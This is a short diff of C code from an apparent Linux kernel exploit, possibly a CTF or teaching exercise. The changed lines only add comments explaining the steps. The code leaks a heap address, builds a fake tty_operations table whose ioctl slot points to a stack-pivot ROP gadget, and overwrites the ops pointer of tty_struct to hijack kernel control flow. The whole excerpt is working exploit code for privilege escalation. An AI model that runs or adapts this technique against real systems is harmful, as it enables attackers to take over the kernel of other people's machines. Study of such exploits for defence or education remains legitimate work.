@@ -109,11 +109,12 @@ void main()
   g_buf = *(unsigned long*)&buf[0x438] - 0x438;
   printf("[+] g_buf = 0x%016lx\n", g_buf);
 
-  // write fake function table 
+  // write fake function table (fake tty_operations). tty_operations[12]
+  // corresponds to ->ioctl() member
   unsigned  long *p = (unsigned  long *)&buf; 
   p[12] = rop_mov_esp_0x39000000;
 
-  // update tty_struct ->ops member
+  // update tty_struct ->ops member to point to our fake tty_operations
   *(unsigned  long *)&buf[0x418] = g_buf; 
   write(fd, buf, 0x420);
   
